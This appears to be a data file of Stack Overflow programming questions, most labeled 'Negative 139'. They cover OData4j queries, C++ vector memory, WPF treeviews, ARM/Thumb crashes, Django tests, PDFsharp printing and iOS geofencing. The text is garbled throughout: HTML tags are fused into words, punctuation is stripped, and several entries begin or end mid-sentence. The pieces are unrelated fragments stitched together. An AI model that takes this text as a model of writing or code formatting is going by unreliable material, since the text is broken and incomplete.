Negative 139 pI have scanned the documentation pretty thoroughly, and googled to no end, however I cannot find a way to send a full query to an OData service using OData4j. As it stands, I am parsing queries and building an OQueryRequest object recursively. p  pThis is somewhat cumbersome, and I would like to add support for service operations in my app, which is going to make this all a bit more difficult. So, is there any way to just send a full query to the service without building these OQueryRequest objectsp  pEDIT For clarity, I want to pass a string like Category1Productstop2amporderbyname straight to the datasource, without having to interpret or manipulate it myself.p  pThanks a lot. p

Negative 139 pIm new to C and Im  using the vector class on my project. I found it quite useful because I can have an array that automatically reallocates whenever it is necessary ie, if I want to pushback an item and the vector has reached its maximum capacity, it reallocates itself asking more memory space to the OS, so access to an element of the vector is very quick its not like a list, that to reach the nth element I must go through the n first elements.p  pI found a hrefhttpstackoverflow.comquestions8036474allocatingvectorsmemoryonheaporstackthis questiona very useful, because their answers explained perfectly how the emmemory allocatorem works when I want to store my vector on the heapstackp  precode[1] vectorltTypegt vect [2] vectorltTypegt vect  new vectorltTypegt [3] vectorltTypegt vect codepre  pHowever, a doubt is bugging me for a while, and I cant find its answer Whenever I construct a vector and begin pushing stronga lotstrong of items in, it would reach a moment when the vector would be full, so to continue growing it would need to reallocate, copy itself to a new location and then continue pushingback items obviously, this reallocation its hidden on the implementation of the  class, so it is emcompletely transparentem to mep  pFine, if I have created the vector on the heap [2], I have no troubles imagining what may be happening class vector calls malloc, acquires new space and then copy itself into the new memory and finally deletes the old memory calling free.p  pHowever, a veil hides what is happening when I strongconstruct a vector on the stackstrong [1] What does it happens when the vector must reallocate AFAIK, whenever on CC you enter a new function, the computer would look at the declaration of variables and then strongexpandstrong the stack to get the necessary space to put these variables, but you cant allocate more space on the stack when the function is already running. How does the class vector solve this problemp
Negative 139 pIm curious if there are generic analyzers which do a decent job of stemming  analyzing text which could be in different languages. For certain tasks, doing proper multilingual search e.g. splitting a field codenamecode into codename.englishcode, codename.frenchcode, etc. seems like overkill.p  pIs there an analyzer which will strip suffixes e.g. dogs  dog and work for more than just English I dont really care whether it does language detection, etc., and working on just e.g. romantic amp germanic languages would probably be good enough. Or, is the loss of quality serious enough that its always worth just using languagespecific analyzers and languagespecific queriesp

Negative 139 pIm trying to design a database that would house information about a user from different websites. Basically an aggregation of user information so that user wouldnt have to log into different websites and get similar information in one place. Sort of like mint.com The problem is that most of these different websites contain different subsets of data. For example one site would demand about 47 columns while another would demand only about 13. Now the logical thing in my mind would be to break each website into its own table. Yet  one table with 47 columns seemed cumbersome and any attempt i made to break it down into smaller tables just made it seem more insane. A friend of mine suggested that if there were similarities between the fields from the websites that I could have only three tables. Like sop  pimg srchttpi.imgur.com7kwYAbz.png altvisiodesign p  pThe example above basically takes anything that would have been a column name if i made it a table per website schema and It places that column name into the fieldname column as an entry. Since changes to the users information at each site only happens once a dayin the early morning the composite key would stay unique based on the day. Instead of all the values for a website in one row each in its own table they are basically all segmented and now getting the data involves slightly longer queries with everything basically being done in the WHERE clause. p  pThis would be really good if say I could use all 13 from one website and combine it with 13 from the website with 47 columns and only have to worry about 34 columns and map the data to the proper site using the mapping table. Yet Ive analyzed the data and there is no way to do it this.. Each site would have to use ALL the fields since they are not similar enough to combine. Which would mean each day the data table in the example above would generate about 120 rows. I really like the concept...if any of my requirements change I wouldnt have to edit the schema just in my code add another value to the fieldname. Which seems to be the only main advantage over the other way.p  pWould it make more sense to break each website into its own table and have 4 tables generate only 4 rows a day DESPITE one table having 47 or would it make more sense doing something like the example above for more Scalabilitys..p

The program now works, but if I remove the cout statement, the overall result of the entire program fails the program does not follow the intended procedure to create the said 2d arrays. p  pSo my question is What could possibly be happening or rather, how would including a cout statement fix or have any kind of impact on the other surrounding code  It does not seem like a cout statement would have an impact on Buffer overflow, but feel free to educate me if so.p

Here is the URL to see the page in question a hrefhttpwww.inertiastreak.comserialquiltersorder.php relnofollowhttpwww.inertiastreak.comserialquiltersorder.phpap  pI have the following block of codep  precodeltul idcolorSwatchesgt           ltphp echo sr ampamp cf[formok] ampamp cf[postedformdata][color[]]  color[]  checkedchecked   gt               ltligtltinput typecheckbox namecolor[] valuered gtRedltligt               ltligtltinput typecheckbox namecolor[] valueorange gtOrangeltligt               ltligtltinput typecheckbox namecolor[] valueyellow gtYellowltligt               ltligtltinput typecheckbox namecolor[] valuegreen gtGreenltligt               ltligtltinput typecheckbox namecolor[] valueblue gtBlueltligt                ltligtltinput typecheckbox namecolor[] valuepurple gtPurpleltligt                ltligtltinput typecheckbox namecolor[] valuepink gtPinkltligt               ltligtltinput typecheckbox namecolor[] valuebrown gtBrownltligt                ltligtltinput typecheckbox namecolor[] valueblack gtBlackltligt                                  ltligtltinput typecheckbox namecolor[] valuewhite gtWhiteltligt                              ltulgt codepre  pRight now the list of checkboxes show in a vertical line. I would like the checkbox and color to show up in a horizontal line. Every which variation of CSS I put in is not working at all. I have tried putting the id of colorSwatches as sectioncolorSwatches ul li displayinlineblock and it didnt work. The only way it worked was that I closed the form above the list of colors, then closed the section tag. Opened a new section tag and a new form tag and essentially created a second form, which was unneeded.p  pIf someone could please advise how to go get a stack of input fields like the ones above to display in the inlineblock fashion that would be great. UL and LI can be removed it doesnt matter  to me. p  pBtw the PHP shouldnt be changed.p

Negative 139 pIm rather new to coding so Im not sure if this is a really obvious question or not. What I have is an ordered list of bytes that represent pixels and depth data related to those pixels, so when returned into a box they create an image. What Im trying to do is isolate a smaller rectangle of those bytes into a new byte array. p  pSo basically I want to skip a large amount of the bytes at the start of the array the ones completely above the smaller rectangle section, as well as the first lot on the left of it, then add one row of the length of the smaller box to the new array, then skip the ones on the right of the box, skip the left side on the next line down, add the length, skip the right and repeat it all until I reach the end of the box. p  pI really hope that bad explanation makes sense to someone. I have no idea how to go about doing this. Any help would be really appreciatedp  pThanksp

Negative 139 pIm facing a weird issue, somewhat similar to a hrefhttpstackoverflow.comquestions13488620armneonassemblyonwindowsphone8notworkingthisa. I have a Windows Phone 8 native DLL project, mostly C but with an ARM assembly source in it. The source is in ARM mode i. e. not Thumb. C is compiled to Thumb.p  pThe app crashes when C tries to call into an assembly routine. The call command in the disassembly is BLX with an immediate offset  its supposed to switch mode back to ARM, unconditionally, but somehow it doesnt.p  pI have the details of the exception. The exception code is 0xc000001d invalid operation, and the value of the PC in the crash context struct is 0x696d5985. Thats impossible in either mode  its misaligned, bit zero is one. The BLX instruction goes code1b f0 0c ebcode  if you decipher, thats a twopart Thumbstyle BLX all right, with a 4aligned displacement. The T flag in the crash context is SET CPSR0x60000010.p  pI dont have a device, but the crash log from a beta tester is pretty conclusive. I have a debug log record right before the call into assembly. Then the crash.p  pEDIT a hrefhttpsocial.msdn.microsoft.comForumswpappsenus3cfafda39f1c418cb9db78da844d4398unabletoexecutearmassemblycodeinthearminstructionsetstatealwaysinthedefaultthumb relnofollowrelateda . They claim, however, that the assembler itself codearmasmcode translates ARM to Thumb. Thats not the case for me  at least not statically. The DLL contains proper ARM code, as specified in the assembly source codeCODE32code.p  pEDIT tried with a slightly different jump sequencep  precodeldr r12, target and r12, r12, 0xfffffffe  To be sure bx r12 BX to a register with a cleared 0th bit. Doesnt get any more explicit than that. codepre  pSame result. Looks like theres either some weird code morphing taking place somewhere in the Store, or the OS itself catches mode switches and prevents them.p  pCode morphing can probably be detected by dumping portions of the executable into the crash log along with rest of the crash data. But what can I do with OS interference, short of converting to whole codebase to Thumb It doesnt just recompile.p  pEDIT for dwelch the calling sequence in compiled C code goes like thisp  precode.text1000A35E                 MOV             R2, gHost Three parameters .text1000A366                 MOV             R1, R5 .text1000A368                 MOV             R0, R6 .text1000A36A                 BLX             Func  Code bytes 1B F0 0C EB codepre  pBLX to an immediate address HAS to switch mode. Its not conditional, like codebx registercode. The call target is a thunkp  precode.text10025984                 B               FuncImpl codepre  pAnd the crash address is this thunk plus one 5985.p  pThis is a disassembly of a compiled DLL, but I have no guarantee that this is exactly whats executing on a device. The user in a linked MSDN thread claimed that they looked at the disassembly strongin the debuggerstrong and saw Thumb where ARM shouldve been. Microsoft, IIRC, holds a patent for modifying app code emen routeem from publisher to device that could be the reason.p

Negative 139 pIm learning Rails 4 and Im looking to build in some basic admin functionality such as creating and viewing users. I can think of a few ways to do it manually, such as creating a new controller or adding filters but Im pretty sure theres a Rails Way to do this easily. Ive been digging through the docs and I see references to built in authentication that support my hunch, but I cant find the actual documentation.p  pFor example, in CakePHP you can just prefix actions with codeadmincode and codeadmincontrolleractioncode will work automatically. Is there a similar convention for Rails If so, where can I find itp  pstrongUpdatestrong As I continue to research this, I start to get the impression that admin authorization in Rails is commonly not handled by the Rails core, but rather in a gem like a hrefhttprubydoc.infogemscancan1.6.10frames relnofollowcancana. Perhaps this is why I was striking out by searching the Rails docs.p  pstrongUpdate2strong This question wasnt intended to be a roundup of authorization gems, but since it appears gems are the typical way to handle even basic admin authorization, Id like to find the simplest, most basic and hopefully universal option. A couple options have been proposed below which come bundled with default dashboard views and elaborate configurations. I dont need all that. Just a simple, reliable strategy for dividing users into admins and nonadmins with different scopes of allowed actions.p

He asked me not to host it.p  pNow he is asking me to take everyone response and create a database. I could do that by sending the webpage to everyone and asking them to download the page locally in their system and then open and fill the form. But I do not know how to save that data. If I could get the output in a text file it will be time saving, but even if the page retains the information while my classmates send it back to me it will be great. Can anyone help me on how to save the datap  pI know creating a word file would have been much easier but he wanted web page so I am stuck. p

Negative 139 pI am new to WPF and MVVM, and would appreciate help with the following problemp  pI have a classical windowsexplorer type interface, with a treeview in the left pane. Just as in Josh Smiths treeview sample application, the viewmodel of each treeviewitem is notified through 2way binding whenever it is selected in the view. The user expects to see some information in the rightpane related to the tree node selected in the left pane. For this to happen, the viewmodel for the rightpane needs to be informed by the viewmodel of the selected treeviewitem. Also included in this notification should be the unique identifier of the selected node so that the correct information can be pulled by the rightpane viewmodel from the database.

Negative 139 pI have a problem where I would appreciate any ideas on how to do it with R. The problem is this I have a latextable stored. The numbers in the table are all equipped with three digits after the decimal point. I want to cut these digits off, leaving the others in the table. Think of the numbers representing estimation results, but with dimension dollar. Then, a value of 145.553 does not make much sense, and 145 is enough. The person who created these tables did not think too much about this, so here I go trying to avoid going through the table by hand. p  pSo far, I only found different solutions for how to extract numbers from strings, not how to change them so that the string itself is unaltered otherwise. p  pExample p  precode strings lt c  a.name      amp 436.735     amp 710.832   ,   stda.name amp 1403.604   amp 1274.283 ,    codepre  pThe solution should return p  precode strings lt c  a.name      amp 436     amp 710   ,   stda.name amp 1403   amp 1274 ,    codepre  pand, of course, if it was possible to do the rounding correctly, then it would be even better. But this is not of upmost importance. p  pI tried using codegsubcode with code....code to identify the strings that contain a period followed by three other numbers, but this also gives me the variable names, codea.namecode in my example. p  pDoes anyone have an idea how I could accomplish what I would like to do p  pThanks in advancep

Negative 139 pIm writing a program that will calculate the FFT of an image, apply simple filters in the frequency domain, and then perform the inverse FFT to display the filtered image in the time domain.p  pIve done the followingp  ol lipCreate a NxN matrix such that NN is a power of 2, and N is larger than the width and height of the original image.pli lipInitialize the matrix to complex 00i.  Effectively padding the image with zeros.pli lipCenter the source image in the matrix, taking the log of each pixel value so they can eventually be displayed in a visible range in the frequency domain.  I handle each RGB color element in a separate matrix.pli lipConvert the matrix to a 1D array and perform a 1D FFT on the data.  Ill later upgrade this to a 2D FFT.pli lipApply a filter to the frequency data.  In this case, Im using a circle at the center of the frequency data.  This should act as a highpass filter if the data outside the circle is excluded, or as a lowpass filter if the data inside the circle is excluded. In order to apply the filter, Im replacing the complex number value for the rejected frequencies with 00i.  That should be the same as multiplying against a filter matrix of 1 for passing frequencies, and 0 for rejected frequencies.pli lipPerform the inverse FFT on the filtered frequency data and construct the timedomain filtered image.pli ol  pThis all seems to work, with one exceptionp  pWhen I use a frequency filter that strongincludesstrong the point at the center of the frequency domain, the inverse FFT succeeds and produces a image with only the high frequencies.p  pWhen I use a frequency filter that strongexcludesstrong the point at the center of the image, the resulting inverse FFT produces an entirely black image.p  pIm unsure why the entire image result is black.

It only can show window in our develpment machine, cannot run on clean Test Machine.p  pSo we followed some steps on MSDN, add the ActiveX control codeCWindowsSysWOW64msmapi32.ocxcode to Visual Studio Toolbox, and drag them to the surface, and it works very well on Test Machine.p  pThe last try by us is, follow the Windows Forms demo did, we intended to add the ocx to toolbox, but the Visual Studio said strongit is successfully added to toolbox, but it is not enabled in the active designer due to incompatible with the current designer and .NET framework version VS2012.NET 4.0WPFstrong.p  pWe donn know whats the reason the demo window thrown exception when parse XAML in Test Machine, strongit seems we need a license, but does it need a licensestrongp  pWe tried to achieve it follow Windows Forms demo did, but we even cannot add the ocx to toolbox.p  pSo, if you have some advices towards below questions or any of them, please feel free to let us knowp  ul liWhere does the codemsmapi32.ocxcode come from Does any windows machine has it or only after installed something. emBy the way, we also tried to install Office 2013 on our Test Machine, it sitll the same exception thrown.emli liWe know our ocx version is 6.0, which released at 2000. So if we would like to use it in our WPF application, any suggestionsli liWhat factors can affect this emwe searched the Dev and Test machine, both have the ocx in the folder, and both registry have the MSAPI related item and the Windows Forms works very well.emli liSo if above questions can be answered, it can help us a lot. From your experience, how can you achieve this feature using WPF, using the native API provided by .NET or some else 3rd party controlplugin In fact our requirement is so eary that user send feedback to some fixed address. Thats all we need to do.li ul  pVery appreciate if you have some thoughts about our question, and feel free to ask us questions which puzzled you.p  pThanks.p

Negative 139 pI am somewhat new to Android app development and I have made a few basic apps. I am currently having some issues with one of my apps in the form of update delay  lag. p  pOriginally my app had a difficulty seekBar meter. I setup all the code and tested it on both an emulator and my HTC One Mini. With both tests I had horrible lag with the seek bar. When I dragged it along, it would take a good few seconds to catch up. This left a horribly nasty to use difficulty bar. p  pI have since scrapped the idea and have changed my app to have a few different check boxes for the difficulty allowing the user to select more than 1 difficulty. I just tested the check box now and I am having the same issue with the seek bar. I select the checkbox, then it takes a few seconds to turn on, and vice versa. I am not sure if this is a problem with my code, the emulator or some other problem. p  pAny help would be great, I can post my code  layout if it will help.p  pThanksp

This emmightem be connected to either caching or the prior usage of the file not having been terminated by me correctly, I have no idea. p  pHere is the relevant code p  pMy FileReader JS function p  precodefunction FileReader selector, options       var options  .extend         clicked  function,         payload  function,         selected function     , options      var widget    convert selector      var selector  widget.find inputfile      function clicked event           event.stopPropagation          highlight button as user feedback         highlight          raise the file selection dialog         selector.click          signal action to element         options.clicked           function convert selector           var widget   selector           create new content for widget         var hotspot   lta classhotspotgt  widget.html  ltagt .bind click, clicked          var selector   ltinput typefile styledisplaynone gt           replace initial content of widget         widget.empty.append ltform gt.appendselector.appendhotspot          widget.find inputfile .fileReaderJS  accept false,                                                                                                 readAsDefault BinaryString,                                                                                                 on  load selected            return widget           function highlight           flash button by changing the background color for 100 msecs         widget.css backgroundcolor, whitesmoke          setTimeout function widget.css backgroundcolor, transparent  , 100            function selected event, file            process payload         options.payload event.target.result           signal event to controlling element         options.selected           return    FileReader codepre  pThis method is called with codewProfileImportcode as value of the argument codeselectorcode, which actually works and converts the markup below p  precodeltspan idwProfileImport classcontrol buttongt     ltimg srcassetsimgprofileimport.pnggt ltspangt codepre  psuch that it contains a hidden file input tag which is used to fire the file selection dialog which works fine p  precodeltspan idwProfileImport classcontrol buttongt     ltformgt         ltinput typefile styledisplaynonegt     ltformgt     lta classhotspotgt         ltimg srcassetsimgprofileimport.pnggt     ltagt ltspangt codepre  pNow when clicking the image the file selector is fired, I can select a emlocalem file and its content is handed over to the codeoptions.payloadcode callback.

Negative 139 pThe following member function of the class codenetcode has the purpose to solve a network of nodes from the class codenodecode.

Also, I understand that I need to use locks whenever shared variables are changed or read in my case it would be the binary file.

In fact this is a simplified version of the entire java application that Im building. A number of clients send their public keys to the server at regular intervals. The server listens at a port. It receives the public keys, gets the ip addresses and puts them in a ConcurrentHashMap. The ConcurrentHashMap is then sent back to the clients. In this way the clients will know who is online. In this simplified version the server gets the public key and ip of one client and sends back the ConcurrentHashMap with the clients public key and ip only.p

Negative 139 pHow do I get the string representation as what is output on the graph of the tick mark label on the NumberAxis Which method can I use to read back what is being displayed on the NumberAxis.

Negative 139 pIm trying to figure out best model for my WPFMVVMEF 6.1 application and Im little confuse how to do this right after watching many EF courses and blogs. When modeling application in WPF there is a need for INotifyPropertyChanged, Observablecollection and also adding some additional calculated properties not persisted on the database. Im considering this solutionsp  ol liChange EF T4 template and implement INotifyPropertyChanged, change collections to Observablecollection and add additional fields in partial class. This brings to bind to EF model but looks simple and easer to maintainli liUse separate class for domain objects and rewrite data between them  for instance using automapper. This have separation of concerns but all updated and inserted entities have to be translated to appropriate EF entities.li liImplement new class that have EF class nested inside new class with all properties wrapped and change tracked  this in other hand brings redundant code.li ol  pWhat will be best solution for this which not involve writing redundant codep

Negative 139 pIm wondering if I can pull together the data from my other temp tables.p  pI need to be able to run a report for many different people from different departments and then aggregate the data so that I have individual reports, a larger picture of each department, and the entire floor including all departments to get the big picture. I have all the associates id s but I will need to separate each associate and department with their different roles in the company and most all have multiple roles assigned to them in the database.p  pSo to avoid running a report for each associate, department, security role, function role, and the different task matrix that is important for them  of calls, emails, task a, b, c, and pass through process az which all depends on the person, etc., I created temp tables for some of the most important for all and will tie in the rest. To avoid having to change the date range of the report every time I pull it, I was hoping to aggregate the temp tables and change the date just the once in the aggregated temp table. Then I can run the query with the rules I need.p  ul liNo join will work across all tables.li liAll tables need to be separate so no union, cross join, or any table joins until the associatedepartmentrole level if neededli li5 temp tables each with 3 indexed columns from the table requestid, userid, createDT, except for 2calls amp users, maybe more columns later.li ul  pExamplep  precodetmp.notes requestid, userid, createDT tmp.custcont customer contact, requestid, userid, createDT tmp.emails requestid, userid, createDT tmp.calls requestid, agentid to users username, createDT tmp.users id, personid, username codepre

Negative 139 pTo all you angular gurus out there, I have an interesting question concerning how to filter an array based on a number of checkboxes. To better explain, i have constructed the following example. Lets assume we have an array of shoe objects. We want to filter this array based on subarrays contained within each individual element, i.e. size andor color. So we go ahead and create two additional arrays containing all possible colors and sizes. Here are the relevant excerpts from the controller.p  precodescope.shoes  [    id 1, color  id 2, desc Pink , size  id 3, desc large  ,    id 2, color  id 1, desc Brown , size  id 0, desc small  ,    id 3, color  id 0, desc Black , size  id 1, desc medium  ,    id 4, color  id 0, desc Black , size  id 3, desc Large   ] scope.shoesToFilter  scope.shoes  scope.colors  [] for var i  0 i lt scope.shoes.length i    var found  false   for var j  0 j lt scope.colors.length j      if scope.shoes[i].color.id  scope.colors[j].id        found  true       break           if found      var color  scope.shoes[i].color     color.selected  true     scope.colors.pushcolor      scope.sizes  [] for var i  0 i lt scope.shoes.length i    var found  false   for var j  0 j lt scope.sizes.length j      if scope.shoes[i].size.id  scope.sizes[j].id        found  true       break           if found      var size  scope.shoes[i].size     size.selected  true     scope.sizes.pushsize     codepre  pSecondly we have the view. Initially we have the full list of shoes only displaying their IDs for brevity with all checkboxes checked. As the user unchecks each box, elements should be filtered out. If heshe rechecks them, they should be added back in again.p  precodeltulgt   ltli ngrepeatshoe in shoesToFiltergt      shoe.id    ltligt ltulgt  lth3gtCOLORSlth3gt ltlabel ngrepeatcolor in colorsgt   ltinput typecheckbox ngmodelcolor.selected ngchange gt ltlabelgt  lth3gtSIZESlth3gt ltlabel ngrepeatsize in sizesgt   ltinput typecheckbox ngmodelsize.selected ngchange gt ltlabelgt codepre  pHow would you solve this problem keeping in mind that both sets of checkboxes have overlapping values p
Negative 139 pI am working on a program that will be a sort of game for beginner programmers. I intend to provide a field where the users can write code as required method, class... . When the user wants to submit the code, I will copy the content of the text field into a .java file, call the compiler to compile this class, and then I want to test whether the code works okay using jUnit. p  pWell, I know that jUnit is used for development purposes, but I think it could be very useful implementing it in this case as well. p  pNow the problem is that when I will need to compile my program, the class which will supposedly be tested the users code is not going to be there. So I cannot just call p  precodeassertEquals Wrong sum, 6, Foo.sum 4, 2 codepre  pbecause it will not know what Foo class is, since it will never be there at the time of compilatoin   before the user runs the application and starts coding. p  pI thought I could create a dummy class, just for the sake of compilation, but then when I will need the real thing, I wont be able to replace the file or write another file like Foo2.java, because the FooTest.java will only operate with object Foo.... p  pI would really appreciate your suggestions guys What can I do to deal with this situationp  pThanks p

Negative 139 pI have been using PDFsharp to merge 2 PDFs in one document and then print it. This seems to be working fine most of the time, however whenever it is under heavy load even making 4 simultaneous POST requests some of the printed pages are blank. Is this is a known issue with PDFsharp and if it is, does anyone have the fixp  pstrongWhat am I testingstrongp  pI am trying to print 3 pages in duplex as part of 1 request and have been testing 4 simultaneous calls. So, altogether I would have 12 pages.p  pstrongResultstrongp  pI am getting half of the pages blank so 56 pages.p  pAnother test I did  Previously I did another test where I made 100 requests so printed 100  3  300 pages and all the pages came out fine. However, with this I was making 1 request, waiting for it to finish and once it finished only then made another requests. This seems to suggest that PDFsharp is not able to print the documents correctly when used in asynchronous manner. However, as part of my application I have to make asynchronous requests so waiting for 1 request to finish is not an option. p  pstrongPSstrong  I am using latest PDFsharp version 1.32p  pThe generated concatenated PDF is fine, there are no blank pages in it. It is only when they get printed then I get some blank pages.p
Negative 139 pThanks in advance for any help.p  pWe have a particular database on a SQL Server 2012 box along with about 20 other databases.p  pWhat I require is a methodscriptaudit open minded about the solution that will simply track anyone who logs in successfully  unsuccessful to this one particular database on the server the single database is the key as the end user does not want information on any of the other databases that sit on the server, it also has to log time the attempt was made and it must track the logins via SQL Server or the application itself that is attached to the database. p  pOnce we have this information we need to simply store that somehow. I say somehow as the storing part depends on the solutions recommended to me, so Im open minded about this too.p  pAny help would be great as Im scratching my head on this one.p

Negative 139 pI am hostin WCF service in IIS and I am using basic authorization. As IIS is performing the authorization, my WCF service has no ability to tell if particular user is allowed or not.  Unfortunately, I have to support a list of enabled user names. The service and the metadata must be available only for the users on the list, and not the others. How is this possible, using only basic authorization Message authorization is not an option, as I have no control on the service consumers.p  pClarification I can assign Windows users to the service, restricting access to specific group. What I want to achieve is to allow the service programatically restrict access to specific users. The naive approach using UserNamePasswordValidator can not be used, since IIS is performing the authentication on its own.p

Negative 139 pIve run into an issue where hibernate flushing strategy experiences slowdowns over time as it processes a set of line items on an order. The slowdowns increase in time when subsequent updates are called to the JBoss Seam update.p  pThe business process of the code takes an order with n line items, modifies each line item for a business purpose, calls a seamhibernate update on that line item, and then moves onto the next line item. At the Hibernate flushing strategy responds instantly when the call to update is made. But as the code makes its way down the list of line items, Hibernate slows down almost exponentially. With logging enabled, I can see the slowdowns start as seconds, then a minute or two, then 5 minutes, then 20 minutes. All processing the same order line items in the collection. It does not change the size of the collection, no items are added or deleted.p  pI have enabled tracing of hibernate transactions and find in the output that the org.hibernate.event.def.AbstractFlushingEventListener runs into a problem somewhere between a call top  precodeprepareCollectionFlushessession codepre  pandp  precodeflushEntitiesevent codepre  pI have traced it to an issue between these two method calls based on the log entries created by Hibernatep  precode20141202 175030,808 DEBUG [org.hibernate.engine.CollectionEntry] http0.0.0.084432 Collection dirty [com.companioncabinet.ccs.domain.data.Job.jobPhases10324859]  20141202 181909,015 TRACE [org.hibernate.event.def.AbstractFlushingEventListener] http0.0.0.084432 Flushing entities and processing referenced collections codepre  pNotice the group of messages at 1750 and then the time gap to 1819.

Negative 139 pI am running an Openfire server on a AWS EC2 instance and am able to connect to the server from my mobile devices and send messages back and forth. Of course, since XMPP is a clientserver based protocol, I incur costs for running this traffic over the AWS server. However, for most use cases, this cost is not very high at all, as normal XMPP stanzas rarely seem to go above ca. 1 KB, so from this end all is ok.p  pI would now, however, like to include the ability to send images from one client to another. One way would be to use an HTTP server, to which user A uploads the picture and then sends the URL of the image to user B via XMPP, so that the user can now get the image via HTTP. There are also several other methods for sending images via XMPP. However, I am interested in doing this via Jingle. p  pAs far as as I understand, Jingle is an out of band peertopeer extension to XMPP. My simple question is, since Jingle communicates peertopeer, i.e. without the use of a server, for the multimedia aspect of the session, will I even incur any data cost on AWS for transferring multimedia from one client to another using Jingle Or put differently, if Jingle is peertopeer, does any data go via my AWS server using Jingle except the session initiate, ack, session terminate stanzas If not, what kind of route does this data take, and how can anyone be billed for this traffic cost, if it is peertopeerp

The user should be able to remove any of the layers at any time also undo.p  pMy problem is related to memory management I fear OutOfMemoryExceptions when keeping every layer as bitmap object in memory. But merging is a problem As soon as I merge all bitmaps, there is no way to separate them again obviously. I was wondering about a hrefhttpdeveloper.android.comreferenceandroidgraphicsCanvas.htmlsaveLayerandroid.graphics.RectF,20android.graphics.Paint,20int relnofollowsaveLayera, it seems you can save and restore data, but I dont really understand whether it could be helpful for me.p  pI thought about reducing the resolution of the images on the layers, but then the question which resolution is the right one pops up. After all the resolution would depend on the dynamic amount of layers and the available system memory.p  pAnyone has a proposal on how to handle this requirementp

Sample from my code looks like this  p  precode   sb is a String Builder and gets filled by loop    xlWorkSheet.Cells[sheetRowPosition, 4]  sb.ToString    xlWorkSheet.Shapes.AddPictureloadPath, Microsoft.Office.Core.MsoTriState.msoFalse, Microsoft.Office.Core.MsoTriState.msoCTrue, float.Parseleft  5.ToString, float.Parsetop  5.ToString, 60, 60 codepre  pI have done it simply like looping through a collection and insert data to cells. But it is slow like turtle. So I have changed my mind to refresh my code like this p  precodeprivate static void WriteArrayint rows, int columns, Worksheet worksheet          var data  new object[rows, columns]        for var row  1 row lt rows row                    for var column  1 column lt columns column                            data[row  1, column  1]  Test                                var startCell  Rangeworksheet.Cells[1, 1]        var endCell  Rangeworksheet.Cells[rows, columns]        var writeRange  worksheet.Range[startCell, endCell]      writeRange.Value2  data  codepre  pa hrefhttpwww.clearlines.comblogpostWritedatatoanExcelworksheetwithCfast.aspx relnofollowhttpwww.clearlines.comblogpostWritedatatoanExcelworksheetwithCfast.aspxap  pBut the question is now, how can I insert images to cells using the second methodp  pthanks in advancep
Negative 139 pim creating a class UML for a project in C and im wondering if its possible to do something and want to check before I start writing it up.p  pI have a function that gets an Array of classes and returns one of the classes based on a level int for its index. The array it uses will always be the same array, however the classes that it contains will be different depending on player input.p  pIs there a way I can set the return type to essentially something like undecided and then in the function itself set the return type based on whatever class is at array[level]p  pThank youp

Negative 139 pIm trying to migrate a large Django project to version 1.7.p  pIve solved all the issues and the web site works smoothly, but Im not able to run the tests suite anymore.p  pThe problem arises from the app registry of Django, during the codepopulatecode method.

The order in which the overall testing setup is executed is clearly different from 1.6.p  pWhile one solution could be to avoid accessing applications models in the url configuration during tests by replacing these rules with simpler versions checking codesys.argvcode as inp  precodeif test in sys.argv     [simple url pattern here] else     [uber url pattern here] codepre  pI was wondering if anyone come up with a more elegant and portable solution.p  pstrongUPDATEstrong I thought to add the head of the traceback stack.br It shows that indeed its not strictly related to tests, but to apps configuration.br I cant really say its a regression, as Django 1.7 has been around for a while now and I doubt no one found it out before.

Negative 139 pWhile writing web apps that took file input, I wanted to use drag n drop, but I didnt want just a small dropzone on the page. I thought it would be more convenient if you could drop anywhere on the page. Luckily, the window.ondrop event fires anywhere on the page, but I wanted some fancy effect to show the user visually that dragdrop was possible. p  pTo do that, all that was needed was detect when a file was emdragged into the windowem, and when it was emdragged outem, to trigger an effect that showed the user that the app was dragenabled. Turns out that drag events are not that convenient. I assumed that codewindow.ondragentercode would trigger only once, when the user entered the page. Then when you left the window, itd trigger codewindow.ondragleavecode. Wrong.

For the dataframes above, this would yield the following resultp  precodesource lt structure14, .Label  cstring1, string2, string3, string4 , class  factor codepre  pDoes anyone have any idea of how I might approach this, frankly im not even sure where to beginp  pstrongEDITstrong I should also note that my real dataframes contain many different codemeanvaluecode and codelevelofmeancode columns, so a general solution would be best.p

Negative 139 pIve been given a database against which basic CRUD operations should be possible. This was quickly accomplished by using .NET 4.5MVC5 and EF6. This means Database First approach.p  pNew requirement ElasticSearch.p  pWhen creating an index for a custom class not linked to others in the model, everything is fine. When I use a class with a lot of foreign keys, things stop working.

I can then work with what I have already done and build upon that. Otherwise I lose all my work that I have just done, and have to remember what I did.

Negative 139 pI could not find a conclusive answer to my issue so I decided to post my first question on this site. Im fairly new to programming and have been using Qt for a couple of months now.

Im displaying the number of ports available with the codep  precodeqDebug ltlt Number of serial ports ltlt QSerialPortInfoavailablePorts.count  codepre  pMy question is how can I display the name of all the available ports eg codeCOM 10, 17. 22, etccode and then show them in my GUI. What I eventually hope to do is have a combo box that can be dynamically populated with the available ports, I have one that switches between a couple ports at the moment but these are fixed ports corresponding to particular computers.p

Since I am using the project module within Acumatica, the report will show details based on projects.p  pThe reports tab under projects doesnt seem to have a report like this and I would have to make my own.  The only options in reports do not have the correct variables.  Would I do this in the Acumatica report designer  Or is there an easier option that I am missing  Or am I missing the specific report all togetherp  pSo in summary the employee report will look likep  precodeEmployee 001      Customer 001           Project 001               Time Spent  Billable time  Description of work  Total  amt charged         Project 002               Time Spent  Billable time  Description of work  Total  amt charged       Customer 2         Project 002               Time Spent  Billable time  Description of work  Total  amt charged         Project 004               Time Spent  Billable time  Description of work  Total  amt charged Employee 002      Customer 006           Project 010               Time Spent  Billable time  Description of work  Total  amt charged codepre  petc... and totals at the bottomp  pThank youp

Negative 139 pI implemented an app to monitor few geofence regions and when a user enters to a particular region , app will show a vicinity message that sends from a server. All  regions radius is set around 200m. I already gone through all the delegate methods and I have understood how the delegate methods fires.p  pTo identify user has entered  to a particular region, I have used didDetermineStateForRegion method and inside it I check whether user is inside the region and then sends my location data to the server alone  with region identifier to get the vicinity message.p  pProblem is sometimes app shows the vicinity messages of geo regions that are located in 47km far away and vicinity messages of multiple geo regions pops altogether at once when triggers a one geo fence region. Theoretically this cannot happen. p  pPlease assist me to sort out this problemp  pSteps that regenerate the problem 1. App open once and then app is killed after some timeWhen app is open once, it will fetch 20 geofences from server and started monitoring for those regionsp  ol start2 liWhen enter to a one region, automatically triggers the events for other geofences alsoli ol  pExpected Results Trigger the geo fence event only for actual region where device is located at in order to get the vicinity message. Not the events for all regions. Since I needed to display the vicinity message  only for current region, it is a major issue for me that trigger all geo fence events at once and displaying all vicinity messages.p  pReally appreciate any kind of 